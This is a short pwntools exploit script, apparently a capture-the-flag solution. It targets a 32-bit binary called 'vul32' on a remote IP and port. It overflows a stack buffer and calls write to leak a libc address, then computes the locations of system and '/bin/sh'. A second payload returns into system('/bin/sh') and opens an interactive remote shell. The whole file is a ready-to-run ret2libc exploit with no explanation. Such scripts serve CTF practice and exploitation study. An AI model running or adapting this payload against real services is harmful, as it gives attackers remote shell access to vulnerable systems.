#!/usr/bin/env python
from pwn import *

#io = process(("./vul32"))
io =remote('202.112.51.154',20001)
elf = ELF("./vul32")
num = 51 

payload = num * 'a'+'\x47'
payload += p32(elf.symbols['write'])
#payload += p32(0x80486b2)
payload += p32(elf.symbols['main'])
payload += p32(1)
payload += p32(elf.got['write'])
payload += p32(4)

io.sendline(payload)
#io.recvuntil("Plz input something:\n\x00\x00\x00\x00\x00\x00\x00\x00\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[")
data = io.recvline() # Plz input
print data
data = io.recvline() # a
print data
data = io.recv(4)
print data

write_addr = u32(data)
#io.recvall()

print "write_addr:"+ hex(write_addr)
libc = ELF("libc.so.6")
#bss_addr= 
wirte_offset = libc.symbols['write']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search('/bin/sh'))
libc_base = write_addr -wirte_offset
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset
print "system_addr:"+hex(system_addr)
print "bin_sh_addr:"+hex(bin_sh_addr)
sleep(2)
payload2 = 'a'*num + '\x47'
payload2 += p32(system_addr)
payload2 += p32(1)
payload2 += p32(bin_sh_addr)
#payload2 += p32(-1)

#print payload2
io.sendline(payload2)
io.interactive()






